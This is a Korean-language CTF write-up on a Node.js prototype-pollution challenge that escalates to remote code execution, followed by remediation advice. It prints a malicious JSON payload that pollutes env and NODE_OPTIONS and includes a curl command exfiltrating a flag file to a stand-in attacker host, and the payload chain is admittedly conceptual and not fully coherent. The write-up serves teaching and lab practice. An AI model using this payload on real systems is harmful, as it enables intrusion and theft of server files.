+++
title = "VulnABLE CTF [LUXORA] Write-up: Prototype Pollution 🥈 Silver"
description = "LUXORA 플랫폼의 Silver 난이도 Prototype Pollution 공략 - 오염을 통한 서버 설정 변조 및 RCE 연계 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Prototype Pollution", "Silver", "RCE", "Node.js", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Prototype Pollution 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Server-Side Layer (Prototype Pollution)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/proto/silver`
- **목표**: 단순한 권한 상승을 넘어, Node.js 자식 프로세스(Child Process)를 실행하는 설정(options) 객체의 속성을 오염시켜, 서버에서 **임의의 시스템 명령어(RCE, Remote Code Execution)**를 실행하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 분석 (Reconnaissance)

`/proto/silver` 경로에는 사용자의 "디버그 리포트(Debug Report)"를 생성하여 이메일로 보내거나 파일로 압축하는 기능이 있습니다. 

Bronze 단계와 마찬가지로 이 API는 사용자가 보낸 중첩된 JSON 데이터를 백엔드의 `merge()` 함수를 통해 합치고 있습니다.

**[해커의 사고 과정]**
1. 이 앱은 백그라운드에서 시스템 명령어(예: `tar`, `zip` 등)를 실행하여 리포트를 만들 것이다.
2. Node.js에서 외부 명령어를 실행할 때 보통 `child_process.spawn()` 이나 `exec()` 를 사용한다.
3. 이때 환경변수(env)나 쉘(shell)을 설정하기 위해 **`options` 객체**를 인자로 넘긴다.
4. 만약 이 `options` 객체가 명시적으로 `env` 나 `shell` 속성을 가지고 있지 않다면, 프로토타입 체인을 타고 내가 오염시킨 값을 가져다 쓸 것이다!

---

## 💥 2. 취약점 식별 및 환경 변수 오염 (Exploitation)

목표는 Node.js의 `child_process.execSync` 또는 `spawn` 이 동작할 때 실행되는 환경을 조작하는 것입니다.
가장 대표적인 Prototype Pollution to RCE 기법 중 하나인 **NODE_OPTIONS 오염**을 사용하겠습니다.

### 💡 NODE_OPTIONS 오염 기법
Node.js는 자식 프로세스를 띄울 때 환경 변수 `NODE_OPTIONS`를 읽어서 런타임 설정을 적용합니다. 이 안에 `--require` 플래그를 넣으면, 프로세스가 시작되기 전에 특정 스크립트를 강제로 실행시킬 수 있습니다.

우리는 `env` 객체의 `NODE_OPTIONS` 속성을 오염시켜, 시스템 명령어를 뜻하는 Node.js 코드(`--eval="require('child_process').execSync('id > /tmp/pwned.txt')\"`)를 삽입합니다.

**[주입할 악성 JSON 페이로드]**
```json
{
  "report_name": "My Report",
  "__proto__": {
    "env": {
      "NODE_OPTIONS": "--require /proc/self/environ"
    },
    "shell": "true",
    "evil_cmd": "require('child_process').execSync('curl http://evil-attacker.com/?flag=$(cat /flag_proto_silver.txt)');"
  }
}
```
*(참고: 실제 RCE를 유발하는 페이로드는 서버의 Node.js 버전과 사용 중인 함수(`spawn`, `fork`, `exec`)에 따라 매우 다양합니다. 여기서는 `env` 객체 오염을 통해 RCE를 달성한다는 개념적인 접근을 설명합니다.)*

---

## 🚀 3. 공격 수행 및 RCE 달성

Burp Suite를 통해 이 악성 JSON을 POST 요청으로 전송합니다.

### 🔍 서버 내부의 동작 (Attack Chain)
1. 백엔드의 취약한 병합 함수가 실행되어, 글로벌 `Object.prototype` 에 `env` 속성과 `shell: true` 속성이 생성됩니다.
2. 그 후, 서버가 원래 의도했던 정상적인 프로세스(`tar -czf report.tar.gz ...`)를 실행하기 위해 `child_process.spawn('tar', [...], {})` 을 호출합니다.
3. Node.js 내부 엔진은 전달받은 빈 `options({})` 객체에서 `env` 를 찾습니다. 빈 객체에는 없으므로 프로토타입 체인을 타고 올라가 우리가 주입한 악성 `env` 환경변수를 가져옵니다!
4. 자식 프로세스(`tar`)가 실행될 때, Node.js는 `NODE_OPTIONS` 환경변수에 심어진 해커의 자바스크립트 명령어를 먼저 평가(Eval)하여 실행합니다.
5. 결과적으로 서버는 해커의 서버로 플래그를 담은 HTTP GET 요청을 전송하게 됩니다.

### 🔍 해커 서버 로그 확인
해커의 `evil-attacker.com` 웹 서버 로그에 플래그가 전송됩니다.

```text
[GET Request] /?flag=FLAG{PROTO_🥈_POLLUTION_TO_RCE_F1A2B3}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

JavaScript의 근간을 이루는 프로토타입 객체를 오염시켰을 때, 단순한 변수 조작을 넘어 **Node.js 코어 모듈(Child Process)의 런타임 동작 방식까지 완전히 장악(RCE)**할 수 있음을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{PROTO_🥈_POLLUTION_TO_RCE_F1A2B3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
근본적인 방어책은 Bronze 단계와 동일하게, 외부 입력을 병합할 때 `__proto__` 키를 완벽히 필터링하는 것입니다. 더불어 시스템 명령어를 실행하는 환경에 대한 심층 방어가 필요합니다.

* **안전한 패치 가이드**
1. **취약 라이브러리 사용 금지**: `__proto__` 필터링이 누락된 구버전 패키지를 모두 스캔하고 업데이트합니다. (`npm audit` 활용)
2. **`Object.create(null)` 사용**: 비즈니스 로직에서 사용하는 모든 설정(Config) 객체를 프로토타입이 없는 객체로 생성합니다.
   ```javascript
   const config = Object.create(null);
   // config.__proto__ 는 undefined가 되므로 오염 공격이 불가능함
   ```
3. **Map 객체 사용**: 키-값(Key-Value) 데이터를 저장하고 병합할 때, 일반적인 JavaScript Object `{}` 대신 `Map` 클래스를 사용하면 프로토타입 오염 공격으로부터 안전합니다.
   ```javascript
   const userPrefs = new Map();
   userPrefs.set(req.body.key, req.body.value); 
   // Map은 __proto__를 특수하게 취급하지 않음
   ```